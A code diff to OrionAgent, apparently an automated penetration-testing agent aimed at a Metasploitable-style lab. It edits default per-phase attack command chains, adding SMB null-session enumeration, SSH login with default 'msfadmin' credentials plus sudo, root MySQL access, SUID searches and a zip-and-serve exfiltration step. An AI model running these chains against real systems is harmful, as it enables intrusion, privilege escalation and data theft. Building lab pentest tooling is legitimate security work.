@@ -1103,6 +1103,7 @@ class OrionAgent(AgentInterface, MemorySyncInterface):
             )
 
         # Fallback: Return phase-appropriate default chain
+        # Phase 8.2 Batch 13: Removed HTTP tools (gobuster, nikto) — MS3 has no HTTP
         default_chains = {
             "recon": [
                 "nmap -sT -T2 -p- TARGET_IP",
@@ -1110,16 +1111,16 @@ class OrionAgent(AgentInterface, MemorySyncInterface):
                 "nmap -A -p OPEN_PORTS TARGET_IP",
             ],
             "enumeration": [
-                "gobuster dir -u http://TARGET_IP -w /usr/share/dirb/wordlists/big.txt",
                 "enum4linux -a TARGET_IP",
-                "nikto -h TARGET_IP",
+                "smbclient -L //TARGET_IP -N",
+                "nmap --script=vuln TARGET_IP",
             ],
             "exploit": [
-                "searchsploit SERVICE_NAME VERSION",
-                "msfconsole -x 'use exploit/SERVICE_PATH; set RHOSTS TARGET_IP; exploit'",
-                "hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst ssh://TARGET_IP",
+                "LANG=C searchsploit SERVICE_NAME VERSION",
+                "sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@TARGET_IP 'echo msfadmin | sudo -S id'",
+                "mysql -h TARGET_IP -u root -e 'show databases' 2>/dev/null",
             ],
-            "privesc": ["find / -perm -u=s -type f 2>/dev/null", "uname -a", "cat /etc/crontab"],
+            "privesc": ["find /usr /bin /sbin -perm -u=s -type f 2>/dev/null", "uname -a", "cat /etc/crontab"],
             "exfiltrate": [
                 "zip -r /tmp/data.zip /path/to/data",
                 "python3 -m http.server",
@@ -1129,7 +1130,7 @@ class OrionAgent(AgentInterface, MemorySyncInterface):
 
         return default_chains.get(
             current_phase,
-            ["nmap -sT TARGET", "gobuster dir -u http://TARGET", "enum4linux TARGET"],
+            ["nmap -sT TARGET", "enum4linux -a TARGET", "smbclient -L //TARGET -N"],
         )
 
     def adjust_agent_parameters(
